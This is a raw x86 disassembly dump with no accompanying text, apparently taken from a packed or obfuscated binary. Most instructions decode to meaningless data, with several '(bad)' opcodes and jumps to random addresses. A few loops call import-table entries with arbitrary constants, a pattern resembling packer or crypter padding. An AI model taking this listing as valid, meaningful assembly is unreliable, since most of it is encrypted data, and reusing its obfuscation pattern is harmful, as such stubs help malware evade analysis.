  412893:	dec    ebp
  412894:	push   0x49815235
  412899:	or     dh,BYTE PTR [edx-0x5b]
  41289c:	mov    dh,0x48
  41289e:	mov    ecx,0xe9e67022
  4128a3:	mov    eax,0xc1ae1357
  4128a8:	or     al,ah
  4128aa:	dec    edx
  4128ab:	adc    al,0xed
  4128ad:	jbe    0x4128dc
  4128af:	ins    BYTE PTR es:[edi],dx
  4128b0:	pop    esi
  4128b1:	test   al,0x41
  4128b3:	mov    BYTE PTR [edx-0x79d51292],ch
  4128b9:	sub    esi,ebx
  4128bb:	cmp    BYTE PTR [esi],dh
  4128bd:	mov    ch,dl
  4128bf:	(bad)  
  4128c0:	xchg   ebp,eax
  4128c1:	sub    dl,dh
  4128c3:	shr    DWORD PTR [ecx+ecx*1-0x8],cl
  4128c7:	or     bl,dl
  4128c9:	setne  BYTE PTR [edx+edx*4-0x20]
  4128ce:	aam    0x34
  4128d0:	xchg   ebx,eax
  4128d1:	adc    al,0x5c
  4128d3:	fcomi  st,st(4)
  4128d5:	mov    ebp,0x78582276
  4128da:	jp     0x4128bc
  4128dc:	clc    
  4128dd:	xchg   BYTE PTR [eax-0x6d3c09aa],dl
  4128e3:	mov    al,0x66
  4128e5:	addr16 push ebx
  4128e7:	scas   al,BYTE PTR es:[edi]
  4128e8:	mov    edx,0xd298a7dd
  4128ed:	stos   DWORD PTR es:[edi],eax
  4128ee:	xchg   edx,eax
  4128ef:	int    0x9f
  4128f1:	xchg   edx,eax
  4128f2:	jg     0x41288f
  4128f4:	cmp    al,0xdc
  4128f6:	inc    ebx
  4128f7:	ja     0x41295e
  4128f9:	(bad)  
  4128fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fc:	into   
  4128fd:	ror    DWORD PTR [ecx+0x29c04cd3],0x9
  412904:	(bad)  
  412905:	call   0x4a2fd237
  41290a:	inc    edx
  41290b:	out    dx,al
  41290c:	and    DWORD PTR [edx-0x12],esi
  41290f:	mov    eax,0x7dd3ac05
  412914:	pop    ebp
  412915:	ret    0x55a4
  412918:	and    edi,DWORD PTR [edx+0x4]
  41291b:	stos   BYTE PTR es:[edi],al
  41291c:	fmul   QWORD PTR [edi-0x665b279a]
  412922:	dec    edx
  412923:	lea    ebp,[ebx-0x46e7310b]
  412929:	push   ecx
  41292a:	stos   DWORD PTR es:[edi],eax
  41292b:	sub    DWORD PTR [edi+0x3c],ebp
  41292e:	je     0x4128b0
  412930:	pop    sp
  412932:	pop    eax
  412933:	(bad)  
  412934:	lock retf 
  412936:	jbe    0x412900
  412938:	nop
  412939:	sbb    al,0x80
  41293b:	pop    edx
  41293c:	mov    ds:0x9331eff9,eax
  412941:	mov    edi,0xd4157f0d
  412946:	inc    edx
  412947:	inc    eax
  412948:	push   ebp
  412949:	xor    bh,ch
  41294b:	pusha  
  41294c:	std    
  41294d:	inc    edx
  41294e:	pop    ecx
  41294f:	jmp    0x41299e
  412951:	sbb    DWORD PTR [eax],ebp
  412953:	jb     0x412929
  412955:	imul   eax,esi,0x3199c0b8
  41295b:	sbb    eax,DWORD PTR [ecx-0x511613d3]
  412961:	repnz pop ebp
  412963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412964:	fldcw  WORD PTR [ebx-0x4c]
  412967:	in     eax,dx
  412968:	loopne 0x41296f
  41296a:	ficom  DWORD PTR [eax-0x33]
  41296d:	add    ebx,eax
  41296f:	xor    dl,dh
  412971:	inc    edi
  412972:	(bad)
  412976:	mov    al,ds:0xe52bbff0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    ebx,ebx
  41297e:	xchg   edx,eax
  41297f:	loop   0x412998
  412981:	cmp    eax,0x4e604f56
  412986:	inc    ecx
  412987:	xchg   ecx,eax
  412988:	sub    eax,0x68a82d98
  41298d:	int    0xa7
  41298f:	dec    ebx
  412990:	aas    
  412991:	and    BYTE PTR [esi],al
  412993:	enter  0x9061,0x88
  412997:	lahf   
  412998:	sub    eax,0x24cbb034
  41299d:	call   0x85360f23
  4129a2:	scas   al,BYTE PTR es:[edi]
  4129a3:	push   ebp
  4129a4:	stos   BYTE PTR es:[edi],al
  4129a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129a6:	es gs pushf 
  4129a9:	pop    ebx
  4129aa:	cmp    ah,ah
  4129ac:	cs sub eax,0x258a0c2d
  4129b2:	pop    ds
  4129b3:	add    ebp,DWORD PTR [edx+ebx*8]
  4129b6:	dec    ebp
  4129b7:	xchg   ebx,eax
  4129b8:	sbb    eax,ebx
  4129ba:	mov    DWORD PTR [eax],ecx
  4129bc:	lds    edx,FWORD PTR [ebx+0x731593fb]
  4129c2:	push   ds
  4129c3:	pop    ebp
  4129c4:	int3   
  4129c5:	mov    ebx,es
  4129c7:	imul   ecx,ebp,0x4e
  4129ca:	inc    esi
  4129cb:	add    DWORD PTR [ebx+0x745290ac],0xc06c0ebb
  4129d5:	out    0x2c,eax
  4129d7:	fcomi  st,st(5)
  4129d9:	xor    BYTE PTR [ebx+esi*1],0xc9
  4129dd:	(bad)  
  4129de:	inc    eax
  4129df:	rcl    DWORD PTR [ebx+0x1],1
  4129e2:	ficomp WORD PTR [ecx+0x7e752a55]
  4129e8:	and    edi,DWORD PTR [eax]
  4129ea:	aaa    
  4129eb:	repz mov edx,0xd3ad4fed
  4129f1:	adc    eax,DWORD PTR [ebx-0x74439cf0]
  4129f7:	fist   DWORD PTR [edx+ebx*8]
  4129fa:	outs   dx,DWORD PTR ds:[esi]
  4129fb:	lods   al,BYTE PTR ds:[esi]
  4129fc:	(bad)
  412a00:	in     al,dx
  412a01:	outs   dx,DWORD PTR ds:[esi]
  412a02:	xor    al,0x63
  412a04:	inc    esi
  412a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a06:	sub    al,0xcd
  412a08:	inc    ecx
  412a09:	retf   
  412a0a:	fld1   
  412a0c:	mov    ds:0x7b087934,eax
  412a11:	push   0x9ad1ac8d
  412a16:	mov    ch,0x12
  412a18:	fistp  QWORD PTR [ebx+0x44b66cd3]
  412a1e:	test   DWORD PTR [eax],ecx
  412a20:	xchg   BYTE PTR [ebp+0x7a],cl
  412a23:	sub    DWORD PTR [edi+ebx*2+0x16db6655],esp
  412a2a:	out    dx,eax
  412a2b:	scas   eax,DWORD PTR es:[edi]
  412a2c:	mov    ds:0x9586b0b0,al
  412a31:	call   0x215d8ed3
  412a36:	jp     0x412a16
  412a38:	ffree  st(6)
  412a3a:	rcr    DWORD PTR [ebp+0x5c],cl
  412a3d:	adc    eax,0x75edbab3
  412a42:	fucomp st(6)
  412a44:	mov    ch,0xf0
  412a46:	(bad)  [edi+0x1e]
  412a49:	inc    esp
  412a4a:	sbb    bl,BYTE PTR [esi-0x477eba1c]
  412a50:	pop    ds
  412a51:	jnp    0x412a8b
  412a53:	xor    DWORD PTR [ecx+0x1af3a384],edi
  412a59:	loop   0x4129e3
  412a5b:	jo     0x412a2b
  412a5d:	jo     0x4129ee
  412a5f:	jns    0x412abb
  412a61:	je     0x4129e5
  412a63:	lock out dx,al
  412a65:	push   ecx
  412a66:	sub    al,0x61
  412a68:	xor    al,bl
  412a6a:	lods   al,BYTE PTR ds:[esi]
  412a6b:	sahf   
  412a6c:	push   DWORD PTR [ecx]
  412a6e:	test   eax,0x2ad9ef13
  412a73:	xchg   ebp,eax
  412a74:	jle    0x412a2f
  412a76:	cli    
  412a77:	pop    ecx
  412a78:	call   0x3e2b:0x8e46785d
  412a7f:	jg     0x412a45
  412a81:	shr    BYTE PTR [eax+0x6932ae49],cl
  412a87:	cmp    BYTE PTR [esi-0x488b79e7],0x5c
  412a8e:	mov    ah,0x5
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e0a0
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fc75,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fc75,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fc75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e297
  412af1:	mov    edi,DWORD PTR ds:0x42fc75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fc75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e0a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e098,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b05
  412b3b:	lock mov ch,0x20
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b2e
  412b47:	jnp    0x412b5e
  412b49:	test   DWORD PTR [ecx+0x2fc25f7a],ebp
  412b4f:	in     eax,0x4d
  412b51:	mov    esp,0x4bcf9d4b
  412b56:	sub    cl,BYTE PTR [edx+0x3f7bbeec]
  412b5c:	mov    al,ds:0x9eb4fc2a
  412b61:	and    DWORD PTR [edx+ebp*1+0x37da0697],ecx
  412b68:	mov    esi,?
  412b6a:	add    DWORD PTR [ebx],eax
  412b6c:	jno    0x412af0
  412b6e:	mov    ecx,DWORD PTR [eax+0x4f]
  412b71:	pop    es
  412b72:	loope  0x412b53
  412b74:	rcl    BYTE PTR [ecx+0x18],1
  412b77:	femms  
  412b79:	ins    BYTE PTR es:[edi],dx
  412b7a:	(bad)  
  412b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b7c:	mov    ecx,0x283ea4f1
  412b81:	mov    ch,0x17
  412b83:	test   al,0xff
  412b85:	js     0x412b98
  412b87:	or     BYTE PTR [ebp+0x2d6d3a90],dl
  412b8d:	dec    esp
  412b8e:	mov    ebp,0xc637b281
  412b93:	pop    ds
  412b94:	sbb    DWORD PTR [eax],0x68
  412b97:	jbe    0x412b28
  412b99:	xchg   esp,eax
  412b9a:	and    eax,0x1d15c400
  412b9f:	int    0xd2
  412ba1:	dec    eax
  412ba2:	mov    ss:0xb9a41d52,al
  412ba8:	mov    al,ds:0x4eed1886
  412bad:	push   dx
  412bb0:	call   0xe03e:0x245eab8e
  412bb7:	mov    dh,0xc7
  412bb9:	test   al,0x8f
  412bbb:	mov    al,BYTE PTR [ecx+esi*1+0x19e18501]
  412bc2:	cli    
  412bc3:	and    bl,BYTE PTR [ebx]
  412bc5:	gs enter 0x3a1e,0x10
  412bca:	lea    esp,[esi+0x33]
  412bcd:	fdivr  QWORD PTR [esi]
  412bcf:	adc    BYTE PTR [edi-0x67],ch
  412bd2:	aaa    
  412bd3:	repz inc edx
  412bd5:	pop    esi
  412bd6:	sahf   
  412bd7:	cmp    eax,0x96ed9855
  412bdc:	data16 out dx,al
  412bde:	jmp    0x412c51
  412be0:	sub    esp,eax
  412be2:	pop    edi
  412be3:	mov    ebx,DWORD PTR [edi+0x70165d91]
  412be9:	pusha  
  412bea:	mov    fs,edx
  412bec:	sub    BYTE PTR [esi],dl
  412bee:	fsub   DWORD PTR [edi-0x6852c853]
  412bf4:	scas   al,BYTE PTR es:[edi]
  412bf5:	mov    ds:0x276c786e,eax
  412bfa:	test   BYTE PTR [ebp-0x52],cl
  412bfd:	mov    eax,ds:0xf36686fb
  412c02:	shl    DWORD PTR ds:0x6ad89404,1
  412c08:	hlt    
  412c09:	cmp    esi,ecx
  412c0b:	jb     0x412c81
  412c0d:	addr16 sbb eax,0x4044821
  412c13:	mov    edi,0xbedcd776
  412c18:	pop    ecx
  412c19:	push   ds
  412c1a:	inc    ebx
  412c1b:	outs   dx,BYTE PTR ds:[esi]
  412c1c:	push   ebp
  412c1d:	daa    
  412c1e:	sahf   
  412c1f:	fwait
  412c20:	ja     0x412bfa
  412c22:	pop    ds
  412c23:	pushf  
  412c24:	jo     0x412bdc
  412c26:	cdq    
  412c27:	js     0x412ca2
  412c29:	sub    BYTE PTR [edi+0x63],0x5b
  412c2d:	adc    edi,edx
  412c2f:	pop    esi
  412c30:	pop    ebp
  412c31:	pushf  
  412c32:	dec    ax
  412c34:	repz add BYTE PTR [esi],ch
  412c37:	inc    ebp
  412c38:	push   cs
  412c39:	dec    edi
  412c3a:	inc    esi
  412c3b:	(bad)  
  412c3c:	cdq    
  412c3d:	push   ebx
  412c3e:	adc    al,BYTE PTR [ebx+0x540bda4c]
  412c44:	lods   al,BYTE PTR ds:[esi]
  412c45:	add    esp,eax
  412c47:	(bad)  
  412c48:	outs   dx,DWORD PTR ds:[esi]
  412c49:	dec    ebx
  412c4a:	sahf   
  412c4b:	inc    edx
  412c4c:	mov    esi,0xcc809b19
  412c51:	add    DWORD PTR [ecx+0x39bedbf1],eax
  412c57:	call   0xb79de24c
  412c5c:	rol    DWORD PTR [esp+ecx*1],0x70
  412c60:	sar    BYTE PTR ds:0x64dd541b,0x81
  412c67:	test   DWORD PTR [ecx-0x48094667],edi
  412c6d:	cs pop ds
  412c6f:	gs pop edx
  412c71:	in     eax,0x97
  412c73:	in     al,dx
  412c74:	fisttp QWORD PTR [edi-0x136f81c5]
  412c7a:	pop    ebp
  412c7b:	les    ecx,FWORD PTR [ebx+ebp*1-0x12]
  412c7f:	and    al,0xf6
  412c81:	inc    edi
  412c82:	retf   
  412c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c84:	(bad)  
  412c85:	mov    dh,0xe5
  412c87:	jmp    0x3aa6:0x9be59c07
  412c8e:	xor    BYTE PTR [ebp+0x3f],ch
  412c91:	inc    esi
  412c92:	mov    ah,0xa9
  412c94:	adc    al,0xd
  412c96:	lods   al,BYTE PTR ds:[esi]
  412c97:	push   ss
  412c98:	pop    ecx
  412c99:	mov    fs,WORD PTR [esi+0x6e]
  412c9c:	ins    DWORD PTR es:[edi],dx
  412c9d:	std    
  412c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9f:	pop    esi
  412ca0:	cli    
  412ca1:	ret    0xee3
  412ca4:	push   esi
  412ca5:	dec    esp
  412ca6:	or     bl,BYTE PTR [ebx-0x7222abca]
  412cac:	mov    dl,0x71
  412cae:	adc    BYTE PTR [edi-0x540041df],0x4f
  412cb5:	and    BYTE PTR [ebp-0x61e6283b],dl
  412cbb:	js     0x412c3d
  412cbd:	retf   
  412cbe:	mov    ch,0xc3
  412cc0:	ins    BYTE PTR es:[edi],dx
  412cc1:	hlt    
  412cc2:	daa    
  412cc3:	cdq    
  412cc4:	imul   edi,ebp,0x664de081
  412cca:	stos   BYTE PTR es:[edi],al
  412ccb:	push   ds
  412ccc:	icebp  
  412ccd:	jbe    0x412c7f
  412ccf:	std    
  412cd0:	jb     0x412c7e
  412cd2:	lea    esp,[ecx+0x40]
  412cd5:	clc    
  412cd6:	cs mov cl,bh
  412cd9:	fldcw  WORD PTR [ecx+0x7c]
  412cdc:	or     ah,BYTE PTR [esi+0x69dd6614]
  412ce2:	ds sbb eax,0xbe41b78
  412ce8:	adc    eax,0x937c5593
  412ced:	adc    BYTE PTR [eax+0x4d],dl
  412cf0:	bound  ebp,QWORD PTR [ebx-0x4c347e9a]
  412cf6:	ss stc 
  412cf8:	cmp    al,BYTE PTR [eax-0x71]
  412cfb:	and    esi,esi
  412cfd:	push   esi
  412cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cff:	ret    0x1b6d
  412d02:	xor    bl,BYTE PTR [edi]
  412d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d05:	popf   
  412d06:	mov    eax,0xe35e00d0
  412d0b:	sub    al,0x46
  412d0d:	push   esi
  412d0e:	outs   dx,BYTE PTR ds:[esi]
  412d0f:	and    ah,BYTE PTR [ecx+0x784bb08]
  412d15:	loop   0x412d6d
  412d17:	sbb    eax,0xd2ddec2e
  412d1c:	mov    eax,ds:0xbd8cc99e
  412d21:	inc    esi
  412d22:	push   ecx
  412d23:	push   ecx
  412d24:	inc    edx
  412d25:	push   esi
  412d26:	jg     0x412d5c
  412d28:	mov    esp,0xc247df31
  412d2d:	retf   
  412d2e:	dec    eax
  412d2f:	lds    esi,FWORD PTR [esi-0x6e]
  412d32:	sbb    al,0x5c
  412d34:	jbe    0x412cb7
  412d36:	mov    ds:0xb67fdf0f,eax
  412d3b:	jmp    0x728e34e9
  412d40:	test   BYTE PTR [edx+0x79e5adea],0x3
  412d47:	xor    BYTE PTR [ebp-0x2f],dl
  412d4a:	jmp    0x6bb7ff78
  412d4f:	mov    cl,0xc
  412d51:	or     al,0xe9
  412d53:	pop    ebx
  412d54:	hlt    
  412d55:	dec    edi
  412d56:	shl    bl,0x5b
  412d59:	xor    al,0x80
  412d5b:	adc    BYTE PTR [eax],al
  412d5d:	lods   al,BYTE PTR ds:[esi]
  412d5e:	in     eax,dx
  412d5f:	mov    ebp,0xbb03fc93
  412d64:	sbb    BYTE PTR [eax+0x7684af6b],dl
  412d6a:	dec    ecx
  412d6b:	ds push cs
  412d6d:	fcom   DWORD PTR [edx+ebx*1+0x4dd365c3]
  412d74:	call   0x366c:0x9c744171
  412d7b:	add    BYTE PTR [esi+0x1bf24594],0x8f
  412d82:	aad    0x3d
  412d84:	iret   
  412d85:	or     al,0xd3
  412d87:	add    ah,0x88
  412d8a:	add    BYTE PTR [ebp+edx*4+0x7],0xb5
  412d8f:	pop    edi
  412d90:	inc    edi
  412d91:	jne    0x412dd9
  412d93:	adc    al,0x7f
  412d95:	test   al,0xd8
  412d97:	or     DWORD PTR [ecx+ebx*8],ecx
  412d9a:	jl     0x412d24
  412d9c:	js     0x412e11
  412d9e:	push   esp
  412d9f:	xor    cl,cl
  412da1:	mov    cl,0xc8
  412da3:	xor    DWORD PTR [esi-0x32],edi
  412da6:	sbb    DWORD PTR [esi+eax*1+0x6528184b],edx
  412dad:	xchg   esp,eax
  412dae:	es xor bh,cl
  412db1:	jmp    0x412dd9
  412db3:	(bad)  
  412db6:	xor    al,BYTE PTR [edi+0x3b0b60b6]
  412dbc:	jb     0x412dca
  412dbe:	nop
  412dbf:	arpl   WORD PTR [edx-0x1d],di
  412dc2:	aaa    
  412dc3:	das    
  412dc4:	jns    0x412db7
  412dc6:	sub    eax,ebp
  412dc8:	aaa    
  412dc9:	fwait
  412dca:	cmp    BYTE PTR [ebp-0x8095e5c],bh
  412dd0:	(bad)  
  412dd1:	sbb    cl,BYTE PTR [ebp+eiz*2-0x52906a3c]
  412dd8:	js     0x412db1
  412dda:	jmp    0x412dbc
  412ddc:	inc    edx
  412ddd:	push   eax
  412dde:	mov    ebx,0x37be9c55
  412de3:	sub    BYTE PTR [edi-0x2e693c9],al
  412de9:	aas    
  412dea:	push   ecx
  412deb:	mov    bh,0x76
  412ded:	imul   edx,DWORD PTR [ebx],0xbc2c90a
  412df3:	mov    eax,0xec2cb6ed
  412df8:	mov    WORD PTR [eax+0x12f90bb9],fs
  412dfe:	push   ecx
  412dff:	inc    ebx
  412e00:	cli    
  412e01:	outs   dx,DWORD PTR ds:[esi]
  412e02:	aaa    
  412e03:	loopne 0x412e6f
  412e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e06:	bound  ecx,QWORD PTR [edi]
  412e08:	bound  eax,QWORD PTR [esi+edi*4-0x31786dcf]
  412e0f:	and    DWORD PTR ds:0x42e09c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e09c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e09c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e09c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e09c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e407
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [eax],ax
  412e76:	addr16 rcl cl,0x5a
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0xee70707e
  412e82:	stos   BYTE PTR es:[edi],al
  412e83:	adc    eax,0x64b24751
  412e88:	jmp    0x20d2:0xcf7aae3
  412e8f:	xchg   edi,eax
  412e90:	adc    eax,0x59a90d98
  412e95:	adc    BYTE PTR [eax],dh
  412e97:	ds scas eax,DWORD PTR es:[edi]
  412e99:	and    esp,edx
  412e9b:	add    ah,BYTE PTR [esi]
  412e9d:	stos   BYTE PTR es:[edi],al
  412e9e:	mov    eax,ds:0xdf20bb71
  412ea3:	sbb    al,BYTE PTR ds:0x78dbc01b
  412ea9:	add    eax,0x1b2d79c1
  412eae:	scas   eax,DWORD PTR es:[edi]
  412eaf:	pop    ss
  412eb0:	adc    al,0xd6
  412eb2:	pushf  
  412eb3:	aam    0x34
  412eb5:	dec    edx
  412eb6:	push   ebx
  412eb7:	stc    
  412eb8:	mov    eax,ds:0xaeec62e5
  412ebd:	inc    esp
  412ebe:	adc    cl,ah
  412ec0:	je     0x412f1a
  412ec2:	leave  
  412ec3:	xchg   ebx,eax
  412ec5:	ins    BYTE PTR es:[edi],dx
  412ec6:	cmp    DWORD PTR [esi+0x47],esp
  412ec9:	inc    ecx
  412eca:	mov    al,ah
  412ecc:	je     0x412f0e
  412ece:	cmp    esp,ebx
  412ed0:	rcl    ch,0xc2
  412ed3:	mov    bh,0x72
  412ed5:	mov    cl,0x9
  412ed7:	dec    edi
  412ed8:	mov    ds:0x2fd91267,al
  412edd:	call   0x5b76:0xc0e854d4
  412ee4:	jnp    0x412f47
  412ee6:	push   cs
  412ee7:	push   ebp
  412ee8:	sbb    ecx,DWORD PTR [ecx+0x7879b11c]
  412eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eef:	repz jae 0x412e80
  412ef2:	xor    DWORD PTR [ebp-0x12],ebp
  412ef5:	jo     0x412e8e
  412ef7:	add    eax,0x115d3fac
  412efc:	popf   
  412efd:	int    0xde
  412eff:	ins    BYTE PTR es:[edi],dx
  412f00:	shr    BYTE PTR [edi+0x434512e6],cl
  412f06:	and    edi,DWORD PTR [edx+ebp*4-0x7218acaa]
  412f0d:	cld    
  412f0e:	repz scas eax,DWORD PTR es:[edi]
  412f10:	retf   
  412f11:	inc    edi
  412f12:	sar    DWORD PTR ds:0x485f55d0,cl
  412f18:	aam    0x47
  412f1a:	mov    esi,0xf6e267e6
  412f1f:	sub    eax,0x8a01bf29
  412f24:	hlt    
  412f25:	push   ecx
  412f26:	pop    ecx
  412f27:	rcr    DWORD PTR [ecx-0x14],cl
  412f2a:	stos   BYTE PTR es:[edi],al
  412f2b:	add    al,ah
  412f2d:	div    BYTE PTR [ebp+0x52abb10c]
  412f33:	(bad)  
  412f34:	cld    
  412f35:	cs inc eax
  412f37:	push   ebp
  412f38:	sbb    edi,DWORD PTR [ecx+0x9]
  412f3b:	xor    bl,BYTE PTR gs:[edi+edx*2+0x48f159e3]
  412f43:	retf   0x8241
  412f46:	ror    BYTE PTR [eax],cl
  412f48:	bound  ecx,QWORD PTR [eax]
  412f4a:	popa   
  412f4b:	(bad)  
  412f4c:	mov    dh,0xf7
  412f4e:	pop    ss
  412f4f:	xchg   BYTE PTR [edi-0x610181d0],ah
  412f55:	and    BYTE PTR [edi],al
  412f57:	or     ebp,DWORD PTR [edx-0x61102edd]
  412f5d:	or     ebx,esi
  412f5f:	je     0x412fc6
  412f61:	mov    ds:0xc7658edf,al
  412f66:	adc    edi,DWORD PTR [ebx-0x62]
  412f69:	hlt    
  412f6a:	jp     0x412f4b
  412f6c:	retf   
  412f6d:	mov    WORD PTR [ecx-0x523bfc9],ss
  412f73:	and    al,0x15
  412f75:	dec    ebx
  412f76:	outs   dx,BYTE PTR ds:[esi]
  412f77:	add    DWORD PTR [edx+0xad41739],eax
  412f7d:	push   ss
  412f7e:	outs   dx,DWORD PTR ds:[esi]
  412f7f:	or     ecx,DWORD PTR [ecx]
  412f81:	push   ss
  412f82:	or     BYTE PTR [edx+eax*4],0xfe
  412f86:	mov    al,ds:0x7eec5ff3
  412f8b:	fisttp WORD PTR [edi]
  412f8d:	mov    ecx,0x63e617c
  412f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f93:	(bad)  
  412f94:	xchg   edi,eax
  412f95:	and    DWORD PTR [esi-0x3ab31535],edx
  412f9b:	imul   edx,edi,0x56
  412f9e:	es out 0xa4,al
  412fa1:	stc    
  412fa2:	jmp    0x22425934
  412fa7:	and    cl,BYTE PTR [ebx]
  412fa9:	sub    dl,BYTE PTR [ebx+0x40]
  412fac:	test   BYTE PTR [ebx+0x1b246f4d],dl
  412fb2:	fbstp  TBYTE PTR [esi]
  412fb4:	xor    eax,DWORD PTR [ebx+0x50]
  412fb7:	sbb    DWORD PTR [ebx+0x403bcd05],esi
  412fbd:	mov    eax,0xc8801bd
  412fc2:	jae    0x412f80
  412fc4:	mov    dh,BYTE PTR [ebx+ebp*1-0x44d4431d]
  412fcb:	mov    cs,WORD PTR [eax]
  412fcd:	fdiv   DWORD PTR [edx-0x3e]
  412fd0:	enter  0xdceb,0xc5
  412fd4:	pop    esi
  412fd5:	shl    DWORD PTR ds:0x95ae0884,cl
  412fdb:	gs dec ebp
  412fdd:	jp     0x412f7e
  412fdf:	jl     0x41301e
  412fe1:	and    BYTE PTR [ebp-0x7a],ch
  412fe4:	fwait
  412fe5:	dec    esp
  412fe6:	pop    esi
  412fe7:	(bad)  
  412fe8:	and    eax,0xf33c9d93
  412fed:	mov    ds:0xef6bb840,al
  412ff2:	dec    ebx
  412ff3:	sti    
  412ff4:	add    esi,esp
  412ff6:	jne    0x412fc0
  412ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff9:	out    0xb5,al
  412ffb:	add    eax,0x106e8253
  413000:	call   0x9bd7:0x72288d40
  413007:	iret   
  413008:	mov    eax,0x7485575
  41300d:	nop
  41300e:	pop    edx
  41300f:	lock cmp BYTE PTR [esi],bl
  413012:	pop    eax
  413013:	frstor ds:0xd6c4438a
  413019:	popa   
  41301a:	or     al,0xfa
  41301c:	add    cl,BYTE PTR [ebx-0x2b]
  41301f:	ds stos BYTE PTR es:[edi],al
  413021:	daa    
  413022:	jle    0x41302c
  413024:	xchg   esp,eax
  413025:	test   al,0xbe
  413027:	fs xchg ebx,eax
  413029:	popa   
  41302a:	pop    ds
  41302b:	outs   dx,DWORD PTR ds:[esi]
  41302c:	mov    esp,0x7822df8d
  413031:	dec    ebx
  413032:	sub    BYTE PTR [eax-0x3f3169b1],dh
  413038:	stos   DWORD PTR es:[edi],eax
  413039:	fistp  DWORD PTR [eax-0x7eb7826e]
  41303f:	inc    ebp
  413040:	repz jmp 0x413036
  413043:	mov    edi,0xb569394
  413048:	fwait
  413049:	mov    ecx,ebp
  41304b:	jmp    0x6970:0x6bbdcc3c
  413052:	arpl   WORD PTR [ebx+0x1680dbd3],cx
  413058:	test   DWORD PTR [esi+eax*2],esi
  41305b:	sbb    BYTE PTR [ebp-0x4b],dl
  41305e:	jns    0x41307f
  413060:	je     0x412ffe
  413062:	adc    ah,BYTE PTR [ebx-0x49]
  413065:	adc    ebx,DWORD PTR [esi+0x1b]
  413068:	(bad)  
  413069:	ret    0x1631
  41306c:	pusha  
  41306d:	inc    edi
  41306e:	cmp    DWORD PTR [ebp-0x32],edx
  413071:	pop    edx
  413072:	aad    0xd0
  413074:	mov    ch,0x67
  413076:	sti    
  413077:	shl    DWORD PTR [ecx],0x6a
  41307a:	adc    al,0x4a
  41307c:	call   0xd25a:0x7dac74e0
  413083:	sbb    DWORD PTR [edx],esi
  413085:	jmp    FWORD PTR [ecx+0x4e]
  413088:	and    DWORD PTR [eax-0x2],eax
  41308b:	pop    esi
  41308c:	mov    ebx,DWORD PTR [edx-0x67]
  41308f:	stc    
  413090:	repnz mov ah,0x70
  413093:	mov    bh,0x3
  413095:	hlt    
  413096:	dec    ecx
  413097:	sbb    al,0xc3
  413099:	div    BYTE PTR [ebx+ebp*8-0x7e]
  41309d:	xlat   BYTE PTR ds:[ebx]
  41309e:	dec    edi
  41309f:	repnz imul esi,DWORD PTR ds:0x142b2de9,0x69
  4130a7:	or     eax,0x1493993d
  4130ac:	jne    0x41307f
  4130ae:	int3   
  4130af:	sahf   
  4130b0:	pop    ebx
  4130b1:	xchg   ebx,eax
  4130b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b3:	pusha  
  4130b4:	mov    ecx,0x761ccf02
  4130b9:	ficomp DWORD PTR [ebp+0x31]
  4130bc:	fnstenv [eax]
  4130be:	iret   
  4130bf:	(bad)  
  4130c0:	(bad)  
  4130c1:	stc    
  4130c2:	adc    BYTE PTR [ebx+ebp*8],ch
